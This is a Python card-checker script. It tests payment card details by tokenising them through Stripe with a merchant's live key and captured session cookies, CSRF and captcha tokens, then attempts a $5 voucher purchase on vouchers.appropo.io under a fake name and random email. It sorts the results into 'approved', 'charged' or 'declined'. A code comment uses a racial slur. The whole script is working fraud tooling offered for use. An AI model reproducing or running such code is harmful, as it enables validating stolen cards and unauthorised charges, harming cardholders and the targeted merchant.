import requests
import json
import string
import random

# Random Email Gen
def email():
    local_part = "".join(
        random.choice(string.ascii_lowercase) for x in range(random.randint(7, 15))
    )
    number = str(random.randint(10000, 99999))
    return local_part + number + "%40" + "gmail.com"

# Extract String
def get_string(string, start, end):
    try:
        sIndex = string.index(start) + len(start)
        eIndex = string.index(end, sIndex)
        return string[sIndex:eIndex].strip()
    except:
        return ''

# Main Function
def flex(cc, month, year, cvc): # Stripe

    # first Request to kulfi stripe @x4rju9
    url = "https://api.stripe.com/v1/tokens"

    headers = {
        "authority": "api.stripe.com",
        "method": "POST",
        "path": "/v1/tokens",
        "scheme": "https",
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7,tk;q=0.6",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    }

    postdata = {
        "guid": "d4b8e68c-52d2-492c-b9ba-89ba2fc3fa17810383",
        "muid": "6b9cd7e7-71f0-4caa-8351-1108993d2b5689b87e",
        "sid": "633c75ad-79d4-4dd9-8aba-9f5424d0a56214580f",
        "referrer": "https://vouchers.appropo.io",
        "time_on_page": "74476",
        "card[number]": cc,
        "card[cvc]": cvc,
        "card[exp_month]": month,
        "card[exp_year]": year,
        "radar_options[hcaptcha_token]": "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiMFlRUGdaK3loZXdQTGFUL2wvMjhmQ3R6WTZkaXN3ZzNHVGZQeVF0bVVHVjJIKzhCWUNUZVppZlgxckpBZVRBaXhqeU1iaGF2cklpREVOV1d5a20rVmlOU3JxdzdqRlR2S3Q0YlE5QldkYTY4dlRSc1VpRFlGSmtDSVk5NnB2enN0V0hVUjVjU3VXR25TTVE1NEVwbGFsSDhFSmFVNzdwYTR5bVlDc0hHelNGZ2ZDRGJZM0NoZUZiOExhYjJRZStOeEJFM3hLZ2w1TGxKTFYyYkp3Zi84b2ZITENGWW0xNG9QcXJYQXp6eEJNQ0J2Y0hIQllkNmtUcVRTTWhVUXF4ZUxYdVcvVTR5VzI1ditGbVJEQ0JKa0pYb2NxVCtwZHkxaWRYZjdMWGxySUlkY0FCYnRPYmNrampIQ0ZscnpVdWZSZWt1V2VLTmRsQjZ0ZG5EQkFQblJyZTVzQysyaU9KZ1didDFYeSt4UVZRWGRKV1V3amtQNWhUZDlFZmRuZ0M4bitZQnFraDNpNkNRTFFVckNDeDB0eUU1OTliZ0NuMjRzcUV1aDhIMjcrL1A0R0VxQlZCWDdiVHdON1NhUGdBK1Vic01OWjBYZkhqS25vc3NidVc0TjVPMm5TSDZ3VU00ckRTNWxWcXdHSGRDbmtvNmFpSm5hd1F2R0ZpNWJiUmtsdWRYU3lra0FXZjZTb291TGpmZVlkd1dUWkhTMGpWYkU3TVZGaWtWWlFRamxOUkhBWTJLcU5jU1NLUS9abitIdG5jL0ZWSjE5byswMjJhcE9kMmdDaUJEUnppZXNLK28zdWpoN0ZqR21NU2hNMGJQY0Fxek9kSTZJUmlGWThtY0VhNm13WHNqTFN4WEJCNTRteEVuTDhSOGMreWlDWkltcXVPOURTL3pKRWgyYlFBakJIenVFWEJFeUNiN2pvcFExMUg0NXRxUnd1U0hvZ3VTd0I5STlVdG9NdHdKMjJqWFZ0WkpKbzdra2xUaXdqVk02UFVaMkVuNnprKzRtdWU3ekRFOUVmN0pYVi9mdHp0OVY0bWpHbUpkdGt2aHkydUdHMXVFSjI3LzNOSkh4WmYvS3dXdWF0UVVFeGFPM3F3SDJFUjNRNGFGYkpOQ08zb05jT0M2b3QxYXIrcEZ6OEpXcDF2eWtvVzBScjhJa2MvNlFwdWtveUlsWHRVanVlbks3MHBrbjAxV2ZJUjFUZ2RDcWUvbWNqbDJXWUQ1Y1crQkFjYVJiMFRJa1NvMWd0VVYxanNXN3RCQWJ4SkUrTWVuVTBDazg5dzFiOGZCa29PVnJsd0JIK0U0OGRuc0VnWlRLVzkzZUF0KzVXWkl1VkpXRnNvQ3VMZ09ZcFdVVlM4TnQ4bFE3TVJUVWZHWGJNempQcGQ3TlcwVFVvY1NSVEg3UjAzT2ZGaUVKbmx2WFB3QlRVSmNsTnBReDNMRGZtemUrVXpjSzNTaVdsMlRkTVVjZm15U0NnSE10MWlnaFkxZWdOYXJUSDd0U0ZQcER2TU9pRGVsT2x6MXlTMUVtZVlWNDVSb0ZNd1ovYmJTREpBczBVQ0VKRDFwM1pQRUVKT2xDR2QvZnlXc2ExS05SSG8yMDZCUExvVUJCTG14MGVJSUExcHRXby9Zd3Y2MDg1Y0xoUDJZUFU3MmlkZnlmejcxOTUrNXdyR0dOOU9HS1piY3hzZGQzVlVnaU5RQ2ExcVh6bHZoR0lkNkVTMVFuVUtqMXFuZHNYcFlab2MwY093U0htaGtlWmZkTWpnNEx4dlZyQU5CUEhIMVU2dUZoZWgrR0REeStka3M2TzExakpKMm5PZUwxWWZWdkJiaUJCRUwyR09YNU9RcGU5RnI2MHdLeXlkcTlIcEVZSGw3cnZvYy9HTGtua3NtTC9mb3ZDUkJ5eWkxUlUvdE8zNEk5aytRdk5LS1AwOEVlR0FXNCtYNFE4dzk1MjNIMVlGdGkzK1A1TnFTZGVJUjVlMGZSa3RqT1Z6RExyYUdRUTNQRVdpdW5Xc0VMdTJiVWZiQ3JmSGg2M0tDbENaOG1wZGUyTnhBTXhKaFlWNXhGUmRFUysrL2ZEbU92UUZWU2V1MUNvdS9lSk4vbXJsVmN1eDA5NnR5YlR6YWk1OEZGUlBFV1VMVGFZVUVXaGM3MWxqT0pSMGRWSzN4Z1dvOXdGTFdlcjdST0UrdW1VTXc2MEFOcm9wYUYzS21HVnF0dmNxVk9Ud3o5cjZkU2FYWVdTOHZIdzJ5ZnZHQzN3c2NZNWRabE5WSUlFdGNBeUFwdTZIUEVMTjg2dlltNitHQ2NwRzI2MHJpU1NDdFFpNVdBWWhrS2RoczJOU1JGVWh3ajlzK0hzUlpwMTZzRjVtK05kOHNDWGhRTS9NZHNuQ0hTRVFDZjU4c1EyVXVtbW5teVpnVDBWU3Frdy9aNC9tUzhwN1FwaWxmSlIyaUdjQlVYSXRyOEZaYlk5S0owK2VLY282cVFvU1Yyc0pMVhHa0lpaUovU3hUQ0FQbTBTeUZwQ0xGZVdtODlBVk9KdVFZNWxvVFNwcFl3M3RVekwwVEt3bHpmS0VnSEs2TVNPT1Q5ei95aW9CMVUrbWFTSUxYcDFjbTAyeXdJMnRWb3B0TTc4YzNJcW4wdXlYQXJSWDRwdzRHTVlRVjl3NU1EVjNwQWV5U3JiSEt1RkwwTXI4SXVoSEswOHFWUWFqZ1YzQ2pjdGNhcElndzZrUjVadytlWFRLUWpMdGZkN0xCZWlEakc2Qm5YeUhNaWpjUmk3cnJvK0IxZFJLTmVEUDVrT3ZNV0l5dStWb0pnQ3BsNTV0K3NiazRBaG5mbUFXRUtwSU5SZDUxWlVrUlhZZmNsZ0FRekxCTWk4eERudGkrdW93czIzVFdYUTM1dDA5TXByazE0aGVqNjF2ODBJSXg2eGhnbVZFeFByRTMzT3VwQkptV2F6Y3QxbjFiMm9zNzdzK3p2QmRVYmc9PSIsImV4cCI6MTcyMzMxMDAyMSwic2hhcmRfaWQiOjI1OTE4OTM1OSwia3IiOiI5ZjIwNmQ0IiwicGQiOjAsImNkYXRhIjoiVmhLS1lnSW5rWG1BdXRjZ3R3T2dNalhFZEtGVFExSThNUW52K1pRVkE3K1FyaG1EWjNEbkRQL0dSc29qazJKVEY5WEg5eGZnZm1iWlFlbzBqTUl2MU1OWncvMzgzT1BwbUthb2poL3lmNjl6NDVwZzVpT1p1L2RncElNV3JndEpjVTRMMEhWenRDNTlVTHoraXk3ZTd0Skxmb1JDZGk4Yi83UXN2WmdkWldoalJ5Ymc0ZWxxYVlPcE50WU9CQld5VndJS1pBM2NFVWsyWkpiZSJ9.SY7GC3fA_y-hBc7m-HNccu6SJUtFVWxJ2OUucQIb10c",
        "payment_user_agent": "stripe.js/b8fb8692cf; stripe-js-v3/b8fb8692cf; card-element",
        "pasted_fields": "number",
        "key": "pk_live_pOBHtjpIDk3jHi7wLBJFeyO2",
    }

    post = requests.post(url=url, headers=headers, data=postdata)
    post = json.loads(post.text)
    id = post["id"]


    # 2nd Requests To Nigga site with full kulfi

    url = "https://vouchers.appropo.io/la-petite-fourchette/checkout"

    headers = {
        "authority": "vouchers.appropo.io",
        "method": "POST",
        "path": "/la-petite-fourchette/checkout",
        "scheme": "https",
        "accept": "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7,tk;q=0.6",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "cookie": "stripe_mid=6b9cd7e7-71f0-4caa-8351-1108993d2b5689b87e; _vouchers_session=hBYTFS7JZYGDCb8EEl5tLWy1%2B1c8%2B6PFCiYOQKHQVu%2FEPkiaCZwoZJEkS6xOngvbBEoyJgJzPgVIxC2WE7aDD6vJnmBtDrI%2FIUvWPaCClQyqefeZ2KXZfuOrnMdSnWd5oBo9vIAFkFlMRaKRjQjHLwJIV6PvgaUG2nhCugPtYE%2Fo3AuHuP7FEYP3qr%2BrY8ZXohG3LwzH3%2BmWjNtLv6GURvIKzJq4I1WAtsLYTnxyYd5V5rk1tVe2gzv4UuTDN84gJXXUK2yiLPTW0jcjYqU0WuY38cYToKt8Rc8BYUZXd2xuRAc0%2FgDST4oCFdAPSxqBQQ%3D%3D--X6Nf%2B%2BPtYF%2BXzzis--iB73cTHTyj74ct%2FtBj2ZiA%3D%3D; stripe_sid=633c75ad-79d4-4dd9-8aba-9f5424d0a56214580f",
        "origin": "https://vouchers.appropo.io",
        "referer": "https://vouchers.appropo.io/la-petite-fourchette/checkout",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "x-csrf-token": "cuoxSXoqAMyUUpFIyLdBx0vCOAIS9zAXRjFIfpcPFialnRCSkUVn_-5eO--9YsklNPZZrc0UjKOkrNnz1tVXeA",
        "x-requested-with": "XMLHttpRequest",
    }

    postdata = (
        "token=tok_1PmIpkKFF1TygqrtnMdoQ4Ov&voucher%5Bamount%5D=5&voucher%5Bpi_amount%5D=0&test=&voucher%5Bdelivery_method%5D=email&voucher%5Bvoucher_type_id%5D=&voucher%5Bname%5D=Jettie%20Nolan&voucher%5Bemail%5D="
        + email()
        + ""
    )
    now = requests.post(url=url, headers=headers, data=postdata)
    time_taken = round(now.elapsed.total_seconds(), 2)
    mes = get_string(now.text, "balance.textContent = '", "'")
    res = mes.lower()
    status = "ᴀᴘᴘʀᴏᴠᴇᴅ"
    if "security code is incorrect" in res:
        status += " ᴄᴄɴ ✅"
        mes = "ɪɴᴄᴏʀʀᴇᴄᴛ_ᴄᴠᴄ"
    elif "incorrect_cvc" in res:
        status += " ᴄᴄɴ ✅"
        mes = "ɪɴᴄᴏʀʀᴇᴄᴛ_ᴄᴠᴄ"
    elif "succeeded" in res:
        status += " ᴄᴠᴠ ✅"
        mes = "ᴄʜᴀʀɢᴇᴅ 5$"
    elif "insuffient funds" in res:
        status += " ᴄᴠᴠ ✅"
        mes = "ɪɴꜱᴜꜰꜰɪᴄɪᴇɴᴛ ꜰᴜɴᴅꜱ"
    elif "insuffient_funds" in res:
        status += " ᴄᴠᴠ ✅"
        mes = "ɪɴꜱᴜꜰꜰɪᴄɪᴇɴᴛ ꜰᴜɴᴅꜱ"
    elif "thank you" in res:
        status = "ᴄʜᴀʀɢᴇᴅ ᴄᴠᴠ ✅"
        mes = "ᴄʜᴀʀɢᴇᴅ 5$"
    else:
        status = "ᴅᴇᴄʟɪɴᴇᴅ ❌"
    return status, mes, time_taken
